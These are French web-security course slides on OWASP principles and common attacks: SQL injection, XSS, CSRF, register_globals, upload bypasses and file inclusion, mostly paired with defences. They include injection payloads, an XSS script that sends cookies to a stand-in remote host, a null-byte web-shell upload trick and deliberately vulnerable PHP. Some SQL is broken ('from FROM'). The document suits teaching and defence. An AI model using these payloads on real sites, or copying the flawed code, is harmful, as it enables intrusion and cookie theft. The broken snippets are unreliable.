Définition

Les principes de la sécurité des application sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succés d'une attaque et l'impact de celle-ci . Les principe de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisé dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisé.

owasp

Les principes de bases

  1. Sécurisation à tous les niveaux de l'application
  2. Minimiser les points d'entrée d'une attaque
  3. Minimiser l'impact des erreurs
  4. Executer avec le minimum de droit
  5. Garder un systeme de sécurité le plus simple possible
  6. Détecter les intrusion(mettre suffisament de log)
  7. Ne jamais faire confiance à l'infrastructure
  8. Ne pas faire confiance au utilisateur

Brute force

Le but d'un brute forcing est de trouver les parametre de connexion en testant toutes les possibilté.

Brute force - Exemple

Voici un simple code generant des mot de passe et les testant sur l'acces à l'administration d'un site vulerable.

Brute force - Améliorations

  • Attaque par dictionnaire
  • Optimisation de la génération
  • Accroissement de la puissance de calcul(supercalculateur, calcul distribué ou botnet)

Brute force - Solution

  • Utilisation de mot de passe robustes
  • Randomisation des mot de passe
  • Eviter de donné trop d'information dans les messages d'erreur
  • Augmenter le temps à chaque tentative (timeur, captcha, etc..)
  • Limiter le nombre de tentative possible
  • Renouvellement des mots de passes

Authentification HTTP

Le protocole HTTP fourni un moyen de gérer une authentification et de restreindre l'acces à une ressources. Il existe deux méthod de gérer cette authentification :

  • HTTP Basic Auth
  • HTTP Digest Auth

HTTP Basic Auth

Si le serveur ne reçoit pas dans l'entête HTTP l'identification correcte voici le genre de header envoyé : 

WWW-Authenticate: Basic realm="Secured Access"

Et voici le genre de header d'identification qui sera attendu: 

Authorization: Basic YWRtaW46YWRtaW4=

'YWRtaW46YWRtaW4=' == base64_encode('admin:admin')

  • PUT : Demande d'enregistrement de données encapsulés dans la requête
  • DELETE : Demande de suppression d'une ressource sur le serveur

Injections

Le but des injections va être de faire executé de code source au serveur ou au navigateur de la victime. Il en existe plusieurs type.

  1. Injection sql
  2. Injection de code applicatif
    • Injection de code client (HTML/CSS/Javascript)
    • Injection de code serveur (PHP/Java/.Net/XML/Json/LDAP/...)

Injections sql

Le but d'une injection SQL est de faire executer une requete sql au serveur afin de modifier son comportement.

Injections sql - Exemple 1

L'attaquant va essayer de passé l'interface d'admin en injectant du code SQL dans le password afin de cour circuiter la verification de la validité du mot de passe. 


$query = $pdo->prepare("select * from FROM users WHERE username='$username' AND password='$password'");
$user = $query->execute();
La requete executé est donc : 
SELECT * from FROM users WHERE username='admin' AND password='admin'
Maintenant si a la place de $password l'utilisateur(ou plutôt le vilain hacker) met : 
' OR '1'='1
SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' 
' OR 1=1"); DROP TABLE users; 
'; shutdown with nowait; --

Injections sql - Exemple 2

La requête : 

SELECT email from FROM users where username='$username'
Maintenant si a la place de $username l'attaquant' met : 
' UNION SELECT password FROM users WHERE id=1
SELECT email from FROM users WHERE username='' UNION SELECT password FROM users WHERE id=1

Injections sql - Le but

  • accéder à des données auxquelles on ne devrait pas avoir accès,
  • modifier des données,
  • effacer des données,
  • lire/écrire sur le système de fichier,
  • exécuter des commandes systèmes.
http://www.cgsecurity.org/Articles/sql_injection/ https://www.owasp.org/index.php/Blind_SQL_Injection

Injections sql - Solutions

  • Ne pas afficher les erreurs mysql
  • Échappement des caractères spéciaux
    • $mysqli->real_escape_string() depuis PHP 5.5
    • mysqli_escape_string() pour les versions antérieurs
  • Utilisation d'une requête préparée
  • Utiliser des comptes utilisateurs SQL à accès limité (en lecture-seule) quand cela est possible.

Injection PHP

Le but de l'injection de code applicatif va être de modifier le comportement de l'application coté serveur.

Injection PHP- Register global

La faille de sécurité "Register global" viens d'une configuration de php register_globals qui si elle est activé peut facilité la création de faille. Si le register_globals a la valeur 'On' alors toutes les variables $_GET, $_POST, $_SERVER sont diponible sous la forme de variable PHP. 


// $username est injecté par php directement si register_globals = On
$username    == $_POST['username']
$username    == $_GET['username']
$username    == $_SESSION['username']
$httpReferer == $_SERVER['HTTP_REFERER']

PHP 5.3 obsolète PHP 5.4 supprimé

Register global - Exemple


if($logged){
	// display admin information
}
							

								http://example.com/admin?logged=1

Register global - Solution

  • Faire attention au variable que l'on utilise
  • Désactivé les register_globals dans la config de php

XSS - Cross site scripting

XSS où « Cross-Site Scripting » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.

Le but de cette attaque est d’effectuer un certain nombre d’actions dans le navigateur de la victime.

Les risques sont multiples :

  • Défacement
  • Redirection
  • Vol de données

Injection XSS

Défacement


<script type="text/javascript">
	msg = "Vous êtes victime d’une attaque XSS !";
	document.write(msg);
</script>

Redirection


<script type="text/javascript">
	document.location = "http://www.serveur-distant.net/page-piege.php";
</script>

Vol de cookie


<script type="text/javascript">
	var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie;
	var imgTag = document.createElement("img");
	imgTag.setAttribute("src",addr);
	document.body.appendChild(imgTag);
</script>

Injection XSS - Solution

  • Supprimer les balises html des données venant des utilisateur mais aussi de la base de donnée
    • htmlspecialchars()
    • htmlentities()
    • strip_tags()

Injection CSRF - Cross Site request forgery

L'approche est la même que les XSS mais le but est différent il s'agit de faire executé une requete à une victime.

Inject CSRF - Solutions

Utilisation de token csrf pour eviter que des requête puisssent etre rejouer.

Les faille Upload/LFI/RFI

Ces failles sont du a des faille dans les script d'upload ou dans l'inclusions de fichier sans contrôle dans une page.

Faille upload

La faille upload permet a un attaquant d'uploader un fihcier sur le serveur qui va contenir du code malveillant. L'objectif est de corrompre le serveur grâce à des trojan, worm, et autre malware.

Faille upload - Basic


$resultat = move_uploaded_file($_FILES['avatar']['tmp_name'],'files/'.$_FILES['avatar']['name']);
if ($resultat) echo "Transfert réussi";
Ici aucun contrôle sur le fichier uploader donc n'importe quel fichier pourrait être uploader sur le serveur(Un fichier php par exemple).

Faille upload - Null byte


$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );
//1. strrchr renvoie l'extension avec le point (« . »).
//2. substr(chaine,1) ignore le premier caractère de chaine.
//3. strtolower met l'extension en minuscules.
$extension_upload = strtolower(  substr(  strrchr($_FILES['avatar']['name'], '.')  ,1)  );
if ( in_array($extension_upload,$extensions_valides) ) echo "Extension correcte";
Ici on verifie l'extension du fichier uploader.

Les Null byte sont des caractère avec la valeur zéro qui en principe marque la fin d'une chaine de caractere. si un attaquant voulais uploader quand même un fichier php il lui suffirait de renomer son fichier : 
c99.php%00.png

Faille upload - Spoofing mime-type

Certain site vont verifier le mime type, le type de fichier uploader. Exaemple de données envoyées en POST lors d'un upload : 

-----------------------------312964014798731795365001168\r\n
Content-Disposition: form-data; name="file"; filename="test.php"\r\n
Content-Type: text/php\r\n\r\n\r\n
-----------------------------312964014798731795365001168--\r\n
Pour modifier le type de fichier il suffit de modifier : 
-----------------------------312964014798731795365001168\r\n
Content-Disposition: form-data; name="file"; filename="test.php"\r\n
Content-Type: image/jpeg\r\n\r\n\r\n
-----------------------------312964014798731795365001168--\r\n

Faille upload - Solutions

  • Ne jamais se fier à ce que peut envoyer le client.
  • Vérifier la configuration d’Apache afin d’agir en conséquence.
  • Ne pas placer le .htaccess dans le répertoire d’upload
  • Ne pas permettre l’écrasement de fichier
  • Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.
  • Ne pas permettre de voir l’index of du répertoire d’upload.
  • Assigner les bonnes permissions au répertoire.
  • Vérifier le mime-type avec getimagesize() et l’extension du fichier.

Faille LFI/RFI

Les faille lfi/rfi viennent d'un appel à la fonction php include non sécurisé qui permet d'inclure soit à des fichiers locaux(LFI - Local file include), ou d'injecter un script php distant(RFI - Remote file include)

Faille include

$incfile = $_REQUEST["file"];
include($incfile.".php");
